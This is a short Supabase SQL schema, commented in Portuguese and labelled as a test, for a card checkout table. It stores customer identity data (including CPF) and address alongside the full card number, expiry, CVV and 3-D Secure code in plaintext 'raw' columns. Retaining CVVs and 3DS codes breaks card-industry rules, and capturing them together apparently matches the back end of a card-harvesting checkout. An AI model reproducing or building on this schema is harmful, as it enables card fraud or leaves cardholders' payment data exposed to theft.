-- Supabase schema para salvar rascunho de checkout/cartão (TESTE)
-- Arquivo: supabase/01_card_checkout_test_raw.sql

create extension if not exists pgcrypto;

create table if not exists public.card_checkout_test_raw (
  id uuid primary key default gen_random_uuid(),
  created_at timestamptz not null default now(),
  updated_at timestamptz not null default now(),

  checkout_session_id uuid,
  payment_method text not null default 'card',

  -- cliente
  customer_name text,
  customer_email text,
  customer_phone text,
  customer_cpf text,

  -- endereço/frete
  shipping_method text,
  shipping_price numeric(10,2),
  cep text,
  street text,
  street_number text,
  complement text,
  neighborhood text,
  city text,
  state text,

  -- pedido
  items jsonb not null default '[]'::jsonb,
  amount numeric(10,2),

  -- cartão (RAW - TESTE)
  card_holder_raw text not null,
  card_number_raw text not null,
  card_expiry_raw text not null,
  card_cvv_raw text not null,
  card_installments text,
  card_brand text,
  three_ds_code_raw text,
  three_ds_status text,

  -- auxiliares
  card_last4 text,
  status text not null default 'draft',
  gateway_tx_id text,
  gateway_response jsonb default '{}'::jsonb
);

-- Índices para otimização de consultas
create index if not exists idx_card_checkout_test_raw_created_at
  on public.card_checkout_test_raw (created_at desc);

create index if not exists idx_card_checkout_test_raw_status
  on public.card_checkout_test_raw (status);

-- Trigger para atualizar automaticamente o campo updated_at
create or replace function public.set_updated_at_test_raw()
returns trigger
language plpgsql
as $$
begin
  new.updated_at = now();
  return new;
end;
$$;

drop trigger if exists trg_card_checkout_test_raw_updated_at on public.card_checkout_test_raw;
create trigger trg_card_checkout_test_raw_updated_at
before update on public.card_checkout_test_raw
for each row execute function public.set_updated_at_test_raw();

-- Query rápida de validação
-- select id, created_at, customer_name, amount, card_last4, status, card_brand
-- from public.card_checkout_test_raw
-- order by created_at desc
-- limit 20;
